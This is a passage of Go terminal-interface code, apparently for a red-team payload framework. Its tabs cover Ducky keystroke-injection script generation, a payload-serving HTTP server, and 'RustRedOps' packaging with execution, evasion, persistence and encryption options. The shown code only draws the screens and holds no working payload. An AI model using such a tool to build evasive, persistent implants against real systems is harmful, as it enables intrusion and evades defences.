		return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center,
			styleError.Render("Terminal too small (need 80x24)"))
	}

	// Render modal if active
	if m.modal != ModalNone {
		return m.viewModal()
	}

	// Header with tabs
	header := m.viewTabs()

	// Main content based on active tab
	var mainContent string
	switch m.activeTab {
	case TabBuild:
		mainContent = m.viewBuildTab()
	case TabDucky:
		mainContent = m.viewDuckyTab()
	case TabServer:
		mainContent = m.viewServerTab()
	case TabPackage:
		mainContent = m.viewPackageTab()
	}

	// Right sidebar with status indicators
	sidebar := m.viewSidebar()

	// Two-column layout - fixed widths
	body := lipgloss.JoinHorizontal(lipgloss.Top, mainContent, "  ", sidebar)

	// Footer
	footer := lipgloss.JoinVertical(lipgloss.Center,
		styleStatus.Render(m.status),
		m.help.View(m.keys),
	)

	// Fixed viewport container
	viewport := lipgloss.NewStyle().
		Width(viewportW).
		Align(lipgloss.Center)

	content := viewport.Render(lipgloss.JoinVertical(lipgloss.Center,
		header,
		"",
		body,
		"",
		footer,
	))

	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, content)
}

func (m TUIModel) viewSidebar() string {
	sidebarStyle := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(colorStone600).
		Padding(1, 1).
		Width(sidebarW)

	// Server status
	serverTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Server")
	var serverStatus string
	if m.server.IsRunning() {
		serverStatus = styleSuccess.Render("● Running")
		serverStatus += "\n" + styleStatus.Render(fmt.Sprintf("  :%d", m.server.Port()))
		logs := m.server.Logs()
		if len(logs) > 0 {
			serverStatus += "\n" + styleStatus.Render(fmt.Sprintf("  %d reqs", len(logs)))
		}
	} else {
		serverStatus = styleError.Render("○ Stopped")
	}

	// Build status
	buildTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build")
	buildStatus := styleStatus.Render("Ready")
	if m.buildMsg != "" {
		buildStatus = m.buildMsg
	}

	// Asset status
	assetTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Asset")
	assetStatus := styleStatus.Render("(none)")
	if m.selectedAsset != "" {
		assetStatus = styleSuccess.Render(m.selectedAsset)
	}

	// Ducky status
	duckyTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Ducky")
	duckyStatus := styleStatus.Render("Not generated")
	if m.duckyLastGen != "" {
		duckyStatus = styleSuccess.Render("✓ " + m.duckyOS + " @ " + m.duckyLastGen)
	}

	content := lipgloss.JoinVertical(lipgloss.Left,
		serverTitle,
		serverStatus,
		"",
		buildTitle,
		buildStatus,
		"",
		assetTitle,
		assetStatus,
		"",
		duckyTitle,
		duckyStatus,
	)

	return sidebarStyle.Render(content)
}

func (m TUIModel) viewTabs() string {
	var tabs []string
	for i := Tab(0); i <= TabPackage; i++ {
		style := styleInactiveTab
		if i == m.activeTab {
			style = styleActiveTab
		}
		tabs = append(tabs, style.Render(i.String()))
	}

	tabBar := lipgloss.JoinHorizontal(lipgloss.Center, tabs...)

	return lipgloss.JoinVertical(lipgloss.Center,
		styleTitle.Render(logo),
		"",
		tabBar,
	)
}

func (m TUIModel) viewBuildTab() string {
	// Targets box
	targetTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Targets")
	targetContent := m.targetList.View()

	// Build button
	btnStyle := lipgloss.NewStyle().Foreground(colorStone400)
	if m.buildFocus == 1 {
		btnStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
	}
	buildBtn := btnStyle.Render("[ Build Selected ]")
	if m.buildMsg != "" {
		buildBtn += "  " + m.buildMsg
	}

	targetsBox := styleBox.Width(mainBoxW).Render(
		lipgloss.JoinVertical(lipgloss.Left, targetTitle, "", targetContent, "", buildBtn),
	)

	// Asset info box
	asset := m.selectedAsset
	if asset == "" {
		asset = "(none)"
	}
	assetRow := lipgloss.JoinHorizontal(lipgloss.Left,
		styleLabel.Render("Asset:"),
		styleValue.Render(asset),
	)
	assetBox := styleBox.Width(mainBoxW).Render(assetRow)

	return lipgloss.JoinVertical(lipgloss.Center, targetsBox, "", assetBox)
}

func (m TUIModel) viewDuckyTab() string {
	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Ducky Script Generator")

	// Build rows with proper alignment
	rows := make([]string, 3)

	// OS row
	osLabel := styleLabel.Render("Target OS:")
	osValue := m.duckyOS
	if m.duckyFocus == 0 {
		osValue = styleFocusedValue.Render(m.duckyOS + "  [space to toggle]")
	} else {
		osValue = styleValue.Render(m.duckyOS)
	}
	rows[0] = lipgloss.JoinHorizontal(lipgloss.Left, osLabel, osValue)

	// URL row
	urlLabel := styleLabel.Render("URL:")
	urlValue := m.urlInput.View()
	if m.duckyFocus == 1 {
		urlLabel = lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Width(12).Align(lipgloss.Right).Render("URL:")
	}
	rows[1] = lipgloss.JoinHorizontal(lipgloss.Left, urlLabel, " ", urlValue)

	// Payload row
	payloadLabel := styleLabel.Render("Payload:")
	payloadValue := m.payloadInput.View()
	if m.duckyFocus == 2 {
		payloadLabel = lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Width(12).Align(lipgloss.Right).Render("Payload:")
	}
	rows[2] = lipgloss.JoinHorizontal(lipgloss.Left, payloadLabel, " ", payloadValue)

	// Generate button
	btnStyle := lipgloss.NewStyle().Foreground(colorStone400)
	if m.duckyFocus == 3 {
		btnStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
	}
	genBtn := btnStyle.Render("[ Generate Script ]")
	if m.duckyLastGen != "" {
		genBtn += "  " + styleSuccess.Render("✓ "+m.duckyLastGen)
	}

	content := lipgloss.JoinVertical(lipgloss.Left, rows...)
	box := styleBox.Width(mainBoxW).Render(
		lipgloss.JoinVertical(lipgloss.Left, title, "", content, "", genBtn),
	)

	return box
}

func (m TUIModel) viewServerTab() string {
	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("HTTP Server")

	// Fixed-width row helper
	labelW := 12
	valueW := mainBoxW - labelW - 8 // account for padding/border
	label := func(s string) string {
		return lipgloss.NewStyle().Foreground(colorStone400).Width(labelW).Align(lipgloss.Right).Render(s)
	}
	value := func(s string) string {
		return lipgloss.NewStyle().Foreground(colorStone50).Width(valueW).Render(s)
	}

	// Status
	var statusVal string
	if m.server.IsRunning() {
		statusVal = styleSuccess.Render("● Running")
	} else {
		statusVal = styleError.Render("○ Stopped")
	}

	rows := []string{
		lipgloss.JoinHorizontal(lipgloss.Left, label("Status"), " ", statusVal),
		lipgloss.JoinHorizontal(lipgloss.Left, label("IP"), " ", value(m.serverIP)),
		lipgloss.JoinHorizontal(lipgloss.Left, label("Port"), " ", value(fmt.Sprintf("%d", m.server.Port()))),
	}

	if m.server.IsRunning() {
		logs := m.server.Logs()
		rows = append(rows, lipgloss.JoinHorizontal(lipgloss.Left, label("Requests"), " ", value(fmt.Sprintf("%d", len(logs)))))

		// Show URL for easy copy
		url := fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
		rows = append(rows, "", lipgloss.JoinHorizontal(lipgloss.Left, label("URL"), " ", value(url)))
	}

	content := lipgloss.JoinVertical(lipgloss.Left, rows...)

	return styleBox.Width(mainBoxW).Render(
		lipgloss.JoinVertical(lipgloss.Left, title, "", content),
	)
}

func (m TUIModel) viewPackageTab() string {
	execN := len(execMethods)
	evasN := len(evasionMethods)
	persN := len(persistMethods)
	rightStart := execN + evasN
	rightEnd := rightStart + persN
	buildIdx := rightEnd + 1

	focusStyle := func(idx int) lipgloss.Style {
		if m.pkgFocus == idx {
			return lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
		}
		return lipgloss.NewStyle().Foreground(colorStone50)
	}

	radio := func(idx int, selected bool) string {
		s := "( )"
		if selected {
			s = "(•)"
		}
		return focusStyle(idx).Render(s)
	}

	check := func(idx int, selected bool) string {
		s := "[ ]"
		if selected {
			s = "[x]"
		}
		return focusStyle(idx).Render(s)
	}

	sectionTitle := lipgloss.NewStyle().Foreground(colorCyan).Bold(true)

	// Execution methods
	var execRows []string
	for i, method := range execMethods {
		row := fmt.Sprintf("%s %s", radio(i, m.pkgConfig.ExecMethod == i), focusStyle(i).Render(method))
		if i == 2 && m.pkgConfig.HollowTarget != "" {
			row += styleStatus.Render(" → " + m.pkgConfig.HollowTarget)
		}
		execRows = append(execRows, row)
	}

	// Evasion methods
	var evasionRows []string
	for i, method := range evasionMethods {
		idx := execN + i
		selected := len(m.pkgConfig.Evasion) > i && m.pkgConfig.Evasion[i]
		row := fmt.Sprintf("%s %s", check(idx, selected), focusStyle(idx).Render(method))
		evasionRows = append(evasionRows, row)
	}

	// Persistence
	var persistRows []string
	for i, method := range persistMethods {
		idx := rightStart + i
		row := fmt.Sprintf("%s %s", radio(idx, m.pkgConfig.PersistMethod == i), focusStyle(idx).Render(method))
		persistRows = append(persistRows, row)
	}

	// Encryption
	encryptRow := fmt.Sprintf("%s %s", check(rightEnd, m.pkgConfig.Encrypt), focusStyle(rightEnd).Render("AES Encrypt"))

	// Build button
	buildBtn := focusStyle(buildIdx).Render("[ Build Package ]")
	if m.pkgMsg != "" {
		buildBtn += "  " + m.pkgMsg
	}

	// Two column layout
	leftCol := lipgloss.JoinVertical(lipgloss.Left,
		sectionTitle.Render("Execution"),
		lipgloss.JoinVertical(lipgloss.Left, execRows...),
		"",
		sectionTitle.Render("Evasion"),
		lipgloss.JoinVertical(lipgloss.Left, evasionRows...),
	)

	rightCol := lipgloss.JoinVertical(lipgloss.Left,
		sectionTitle.Render("Persistence"),
		lipgloss.JoinVertical(lipgloss.Left, persistRows...),
		"",
		sectionTitle.Render("Encryption"),
		encryptRow,
	)

	columns := lipgloss.JoinHorizontal(lipgloss.Top, leftCol, "    ", rightCol)
	content := lipgloss.JoinVertical(lipgloss.Left, columns, "", buildBtn)

	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("RustRedOps Packaging")
	return styleBox.Width(mainBoxW).Render(lipgloss.JoinVertical(lipgloss.Left, title, "", content))
}

func (m TUIModel) viewModal() string {
	var content string
	var title string

	switch m.modal {
	case ModalAssets:
		title = "Assets"
		content = m.assetList.View()
		content += "\n\n[n] add new  [enter] select  [esc] close"

	case ModalFilePicker:
		title = "Add Asset"

		// Path input section
		pathLabel := "Type path:"
		if m.pathInputMode {
			pathLabel = styleSuccess.Render("Type path:")
		}
		pathSection := lipgloss.JoinVertical(lipgloss.Left,
			pathLabel,
			m.pathInput.View(),
		)

		// Browser section
		browserLabel := "Or browse:"
		if !m.pathInputMode {
			browserLabel = styleSuccess.Render("Browse:")
		}
		browserSection := lipgloss.JoinVertical(lipgloss.Left,
			browserLabel,
			m.filePicker.View(),
		)

		helpText := styleStatus.Render("[/] type path  [tab] switch  [enter] select  [esc] back")

		content = lipgloss.JoinVertical(lipgloss.Left,
			pathSection,
			"",
			browserSection,
			"",
			helpText,
		)

	case ModalLogs:
		title = "HTTP Logs"
		logs := m.server.Logs()
		var lines []string
		for _, l := range logs {
			lines = append(lines, fmt.Sprintf("%s %s %s %d",
				l.Time.Format("15:04:05"), l.Method, l.Path, l.Status))
		}
		if len(lines) == 0 {
			content = "(no requests yet)"
		} else {
			content = strings.Join(lines, "\n")
		}
		content += "\n\n[esc] close"

	case ModalInput:
		title = m.inputModalTitle
		content = lipgloss.JoinVertical(lipgloss.Left,
			m.inputModal.View(),
			"",
			styleStatus.Render("[enter] confirm  [esc] cancel"),
		)
	}

	modalW := min(viewportW-10, m.width-10)
	modal := styleModalOverlay.Width(modalW).Render(
		styleTitle.Render(title) + "\n\n" + content,
	)

	// Center the modal
	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, modal)
}
